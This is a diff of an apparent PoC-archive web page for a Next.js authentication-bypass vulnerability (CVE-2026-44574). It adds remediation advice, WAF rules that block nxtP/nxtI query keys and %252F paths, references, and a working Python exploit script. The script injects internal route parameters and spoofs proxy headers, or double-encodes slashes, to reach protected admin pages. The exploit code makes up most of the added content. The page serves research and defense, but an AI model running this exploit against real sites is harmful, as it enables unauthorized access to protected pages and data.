-       class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">
-      <svg class="h-3.5 w-3.5 flex-shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
-      intelseclab/poc-archive
-    </a>
-  </div>
-</div>
-</div>
-  </aside>
-</article>
-
-  </main>
-  <footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800">
-  <div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500">
-    <p class="font-mono">
-      PoC Archive — research artifacts for defensive and educational use only.
-    </p>
-    <p class="font-mono">
-      built with <a href="https://gohugo.io" class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages
-    </p>
-  </div>
-</footer>
-
-</body>
-</html>
+</code></pre><hr><h2 id=remediation>Remediation</h2><table><thead><tr><th>Action</th><th>Detail</th></tr></thead><tbody><tr><td><strong>Patch</strong></td><td>Upgrade Next.js to 15.5.16 or 16.2.5+</td></tr><tr><td><strong>Workaround</strong></td><td>In every protected layout or page, re-derive sensitive params from <code>params</code> (the resolved value), not from <code>request.url</code>; never trust inbound <code>nxtP*</code> query params as route context</td></tr><tr><td><strong>Config Hardening</strong></td><td>At CDN/WAF, drop or reject any inbound request whose query keys start with <code>nxtP</code>, <code>nxtI</code>, or <code>__NEXT_</code>; block requests containing <code>%252F</code> in path segments</td></tr></tbody></table><hr><h2 id=references>References</h2><ul><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2026-44574>CVE-2026-44574 - NVD</a></li><li><a href=https://github.com/vercel/next.js/security/advisories/GHSA-492v-c6pp-mqqv>Next.js Advisory - GHSA-492v-c6pp-mqqv</a></li><li><a href=https://github.com/vercel/next.js/commit/f1c11203d5>Next.js Patch Commit f1c11203d5</a></li><li><a href=https://github.com/dwisiswant0/next-16.2.4-pocs>Source Repository - dwisiswant0/next-16.2.4-pocs</a></li></ul><hr><h2 id=notes>Notes</h2><p>Auto-ingested from <a href=https://github.com/dwisiswant0/next-16.2.4-pocs>https://github.com/dwisiswant0/next-16.2.4-pocs</a> on 2026-05-17.</p><p>No known active exploitation at time of disclosure. The <code>nxtP*</code> / <code>nxtI*</code> injection arm is particularly dangerous in Vercel-hosted deployments where the internal proxy legitimately uses these headers, as WAF rules blocking them may cause false positives. Defense-in-depth recommendation: always authenticate inside the page/layout handler rather than relying solely on middleware pathname matching. Issue tracked as #53.</p></div><div class="mt-10 overflow-hidden rounded-lg border border-zinc-700/60 shadow-2xl"><div class="flex items-center gap-3 bg-zinc-800 px-3 py-2"><div class="flex shrink-0 items-center gap-1.5"><span class="h-3 w-3 rounded-full bg-red-500"></span>
+<span class="h-3 w-3 rounded-full bg-yellow-400"></span>
+<span class="h-3 w-3 rounded-full bg-green-500"></span></div><div class="flex flex-1 justify-center"><div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1"><span class="h-2.5 w-2.5 shrink-0 rounded-sm" style=background-color:#3b82f6></span>
+<span class="font-mono text-xs text-zinc-200">exploit.py</span></div></div><div class="flex shrink-0 items-center gap-2"><span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">python</span>
+<a href=/pocs/web/2026-05-17_nextjs-dynamic-route-injection-auth-bypass/exploit.py target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
+<a href=/pocs/web/2026-05-17_nextjs-dynamic-route-injection-auth-bypass/exploit.py download=exploit.py class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a></div></div><div class="poc-viewer overflow-x-auto"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>CVE-2026-44574 / GHSA-492v-c6pp-mqqv — dynamic-route param injection bypass
+</span></span></span><span class=line><span class=cl><span class=s2>==========================================================================
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Usage:  TARGET=http://localhost:3000 python3 exploit.py
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Attack model
+</span></span></span><span class=line><span class=cl><span class=s2>------------
+</span></span></span><span class=line><span class=cl><span class=s2>Next.js represents matched dynamic-route params and locale information with
+</span></span></span><span class=line><span class=cl><span class=s2>internal search params named `nxtP&lt;name&gt;` (path) and `nxtI&lt;name&gt;` (intercept).
+</span></span></span><span class=line><span class=cl><span class=s2>On vulnerable versions the router accepts these on inbound user requests
+</span></span></span><span class=line><span class=cl><span class=s2>and uses them when building the page&#39;s `params` object.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>That creates a *split-view* primitive:
+</span></span></span><span class=line><span class=cl><span class=s2>  * Middleware sees `request.nextUrl.pathname` = /safe
+</span></span></span><span class=line><span class=cl><span class=s2>  * The App Router renders /admin/[slug] with slug = whatever attacker put
+</span></span></span><span class=line><span class=cl><span class=s2>    in `nxtPslug=...`
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>A second arm of the vulnerability is the encoded-slash double-encoding bug
+</span></span></span><span class=line><span class=cl><span class=s2>in `client/route-params.ts` (fixed in `f1c11203d5`) — the same primitive
+</span></span></span><span class=line><span class=cl><span class=s2>expressed via `</span><span class=si>%252F</span><span class=s2>` in the pathname instead of via internal params.
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>R</span><span class=p>,</span> <span class=n>G</span><span class=p>,</span> <span class=n>Y</span><span class=p>,</span> <span class=n>B</span><span class=p>,</span> <span class=n>N</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[0;31m&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[0;32m&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[1;33m&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[0;34m&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[0m&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>SENTINEL</span> <span class=o>=</span> <span class=s2>&#34;ADMIN_SECRET_FLAG&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>NoRedirect</span><span class=p>(</span><span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>HTTPRedirectHandler</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>redirect_request</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=o>*</span><span class=n>_a</span><span class=p>,</span> <span class=o>**</span><span class=n>_kw</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fetch</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>15</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=n>headers</span> <span class=ow>or</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>    <span class=n>req</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>method</span><span class=o>=</span><span class=s2>&#34;GET&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>opener</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>build_opener</span><span class=p>(</span><span class=n>NoRedirect</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>opener</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>req</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=n>timeout</span><span class=p>)</span> <span class=k>as</span> <span class=n>resp</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>resp</span><span class=o>.</span><span class=n>status</span><span class=p>,</span> <span class=nb>dict</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>getheaders</span><span class=p>()),</span> <span class=n>resp</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>200_000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>urllib</span><span class=o>.</span><span class=n>error</span><span class=o>.</span><span class=n>HTTPError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>e</span><span class=o>.</span><span class=n>code</span><span class=p>,</span> <span class=nb>dict</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>headers</span><span class=p>),</span> <span class=n>e</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>200_000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>  <span class=c1># noqa: BLE001</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>R</span><span class=si>}</span><span class=s2>  network error: </span><span class=si>{</span><span class=n>e</span><span class=si>}{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>,</span> <span class=p>{},</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>header</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>d</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=o>==</span> <span class=n>name</span><span class=o>.</span><span class=n>lower</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>v</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;TARGET&#34;</span><span class=p>,</span> <span class=s2>&#34;http://localhost:3000&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>base</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;PROTECTED_BASE&#34;</span><span class=p>,</span> <span class=s2>&#34;/admin&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>slug</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;PROTECTED_SLUG&#34;</span><span class=p>,</span> <span class=s2>&#34;secret-page&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;PUBLIC_PATH&#34;</span><span class=p>,</span> <span class=s2>&#34;/safe&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>B</span><span class=si>}{</span><span class=s1>&#39;=&#39;</span> <span class=o>*</span> <span class=mi>65</span><span class=si>}{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>B</span><span class=si>}</span><span class=s2> CVE-2026-44574 — dynamic-route param injection (nxtP*)         </span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>B</span><span class=si>}{</span><span class=s1>&#39;=&#39;</span> <span class=o>*</span> <span class=mi>65</span><span class=si>}{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34; Target           : </span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34; Protected route  : </span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/[slug]   slug=</span><span class=si>{</span><span class=n>slug</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34; Public path      : </span><span class=si>{</span><span class=n>public</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># ---- step 1 — baseline -----------------------------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>Y</span><span class=si>}</span><span class=s2>[1/4] Baseline — canonical GET </span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>slug</span><span class=si>}{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>code</span><span class=p>,</span> <span class=n>h</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>fetch</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>target</span><span class=si>}{</span><span class=n>base</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>slug</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  HTTP </span><span class=si>{</span><span class=n>code</span><span class=si>}</span><span class=s2>   Location: </span><span class=si>{</span><span class=n>header</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=s1>&#39;location&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=s1>&#39;(none)&#39;</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># ---- step 2 — arm A: nxtP injection ---------------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>Y</span><span class=si>}</span><span class=s2>[2/4] Bypass arm A — inject nxtPslug on a public path</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>qs</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlencode</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;nxtPslug&#34;</span><span class=p>:</span> <span class=n>slug</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;__nextDefaultLocale&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;__nextLocale&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>url_a</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>target</span><span class=si>}{</span><span class=n>public</span><span class=si>}</span><span class=s2>?</span><span class=si>{</span><span class=n>qs</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  GET </span><span class=si>{</span><span class=n>public</span><span class=si>}</span><span class=s2>?</span><span class=si>{</span><span class=n>qs</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>a_code</span><span class=p>,</span> <span class=n>a_h</span><span class=p>,</span> <span class=n>a_body</span> <span class=o>=</span> <span class=n>fetch</span><span class=p>(</span><span class=n>url_a</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=c1># x-matched-path / x-now-route-matches are the headers a typical</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Vercel-style proxy forwards. They make the inner Next server</span>
+</span></span><span class=line><span class=cl>        <span class=c1># treat the request as if it had already been resolved to the</span>
+</span></span><span class=line><span class=cl>        <span class=c1># protected dynamic route.</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;x-matched-path&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/[slug]&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;x-now-route-matches&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;1=</span><span class=si>{</span><span class=n>slug</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>a_text</span> <span class=o>=</span> <span class=n>a_body</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=s2>&#34;replace&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  HTTP </span><span class=si>{</span><span class=n>a_code</span><span class=si>}</span><span class=s2>   Content-Type: </span><span class=si>{</span><span class=n>header</span><span class=p>(</span><span class=n>a_h</span><span class=p>,</span> <span class=s1>&#39;content-type&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># ---- step 3 — arm B: encoded-slash double encode --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>Y</span><span class=si>}</span><span class=s2>[3/4] Bypass arm B — double-encoded slash in dynamic segment</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>url_b</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>target</span><span class=si>}{</span><span class=n>base</span><span class=si>}</span><span class=s2>/foo%252F</span><span class=si>{</span><span class=n>slug</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  GET </span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/foo%252F</span><span class=si>{</span><span class=n>slug</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>b_code</span><span class=p>,</span> <span class=n>b_h</span><span class=p>,</span> <span class=n>b_body</span> <span class=o>=</span> <span class=n>fetch</span><span class=p>(</span><span class=n>url_b</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>b_text</span> <span class=o>=</span> <span class=n>b_body</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=s2>&#34;replace&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  HTTP </span><span class=si>{</span><span class=n>b_code</span><span class=si>}</span><span class=s2>   Location: </span><span class=si>{</span><span class=n>header</span><span class=p>(</span><span class=n>b_h</span><span class=p>,</span> <span class=s1>&#39;location&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=s1>&#39;(none)&#39;</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># ---- step 4 — verdict -----------------------------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>Y</span><span class=si>}</span><span class=s2>[4/4] Verdict</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>vuln</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>a_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>SENTINEL</span> <span class=ow>in</span> <span class=n>a_text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>vuln</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  </span><span class=si>{</span><span class=n>R</span><span class=si>}</span><span class=s2>x VULNERABLE — arm A: public path returned the&#34;</span>
+</span></span><span class=line><span class=cl>              <span class=sa>f</span><span class=s2>&#34; protected page (sentinel &#39;</span><span class=si>{</span><span class=n>SENTINEL</span><span class=si>}</span><span class=s2>&#39; present).</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>b_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>SENTINEL</span> <span class=ow>in</span> <span class=n>b_text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>vuln</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  </span><span class=si>{</span><span class=n>R</span><span class=si>}</span><span class=s2>x VULNERABLE — arm B: encoded-slash request rendered&#34;</span>
